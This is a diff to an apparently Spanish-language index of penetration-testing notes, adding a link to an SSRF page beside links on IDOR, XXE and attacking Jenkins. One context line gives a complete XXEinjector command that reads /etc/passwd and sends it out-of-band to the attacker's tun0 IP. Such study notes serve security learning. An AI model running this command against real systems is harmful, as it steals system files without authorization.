@@ -4,6 +4,7 @@
 - [IDOR (Insecure Direct Object Reference)](./idor.md)
 - [XXE (XML External Entity)](./xxe.md)
 - [Attacking Jenkins](./attacking-jenkins.md)
+- [SSRF](./ssrf.md)
 - Podemos utilizar [XXEinjector](https://github.com/enjoiz/XXEinjector) para automatizar el proceso de inyección de XML externa.
 - `ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter` Nos tenemos que guardar la petición HTTP de burp
 ```
